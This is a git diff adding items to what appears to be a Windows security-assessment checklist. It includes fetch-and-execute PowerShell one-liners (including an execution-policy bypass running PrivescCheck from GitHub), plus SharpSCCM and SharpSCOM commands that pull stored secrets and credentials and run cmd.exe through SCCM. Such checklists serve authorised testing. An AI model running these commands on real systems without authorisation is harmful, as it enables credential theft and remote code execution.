@@ -34,10 +34,37 @@ For most assessments it makes sense to follow up enumeration on a provided devic
 ```ps
 Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/fkmde.ps1')
 ```
+- [ ] PrivEscCheck.ps1
+```powershell
+powershell -ep bypass -c "Invoke-Expression -Command (Invoke-RestMethod 'https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT"
+```
+- [ ] Seatbelt
+- [ ] WinPEAS
+- [ ] HardeningKitty
+- [ ] msicrab
 - [ ] ScriptSentry - Logonscripts
 ```
 TODO
 ```
+- [ ] Applocker Inspector
+- [ ] WSL Access Review
+```cmd
+wsl --list --verbose
+C:\Windows\System32\bash.exe
+C:\Windows\System32\wsl.exe
+```
+- [ ] [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
+```powershell
+SharpSCCM.exe local secrets -m disk
+SharpSCCM.exe get collections
+SharpSCCM.exe exec -rid  -p "C:\Windows\System32\cmd.exe"
+```
+- [ ] [SharpSCOM](https://github.com/breakfix/SharpSCOM) - SCOM Enumeration
+```powershell
+SharpSCOM.exe get-server
+SharpSCOM.exe get-creds
+```
+
 
 ## Security / Legal
 
